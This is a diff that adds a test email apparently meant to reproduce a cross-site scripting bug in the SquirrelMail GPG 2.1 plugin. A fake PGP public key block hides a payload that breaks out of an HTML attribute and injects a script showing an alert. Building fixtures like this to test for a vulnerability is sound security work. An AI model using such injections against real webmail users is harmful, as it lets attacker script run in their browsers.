@@ -1,0 +1,18 @@
+Message-ID: <50453.10.0.0.1.1192345884.squirrel@mail.example.org>
+Date: Sun, 14 Oct 2007 10:11:24 +0300 (EEST)
+Subject: Test mail with SquirrelMail GPG 2.1 POC exploit
+From: test@example.org
+
+Test mail with SquirrelMail GPG 2.1 JavaScript exploit
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+"><script language="JavaScript">
+<!--
+alert("unsanitized javascript")
+-->
+</script>
+<input type="hidden" name="hideout" value="
+-----END PGP PUBLIC KEY BLOCK-----
+
